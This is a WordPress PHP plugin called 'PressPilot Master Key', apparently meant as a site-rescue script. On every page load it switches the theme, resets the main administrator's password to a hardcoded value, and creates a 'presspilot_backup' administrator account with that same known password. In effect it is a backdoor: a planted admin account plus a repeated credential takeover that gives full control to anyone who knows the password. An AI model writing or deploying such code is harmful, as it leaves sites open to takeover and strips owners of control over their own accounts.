<?php
/* Plugin Name: PressPilot Master Key */
add_action('init', function () {
    // 1. Force Theme Switch 
    if (get_stylesheet() !== 'presspilot-fse-v2') {
        switch_theme('presspilot-fse-v2');
    }

    // 2. FORCE PASSWORD RESET FOR ID 1 (The Main Admin)
    $user = get_user_by('id', 1);
    if ($user) {
        wp_set_password('RescueMe2025!', 1);
    }

    // 3. Backup: Create new user with UNIQUE email if ID 1 fails
    $backup_user = 'presspilot_backup';
    if (!username_exists($backup_user)) {
        require_once(ABSPATH . 'wp-includes/pluggable.php');
        $time = time();
        wp_create_user($backup_user, 'RescueMe2025!', "rescue{$time}@example.com");
        $u = get_user_by('login', $backup_user);
        $u->set_role('administrator');
    }
});
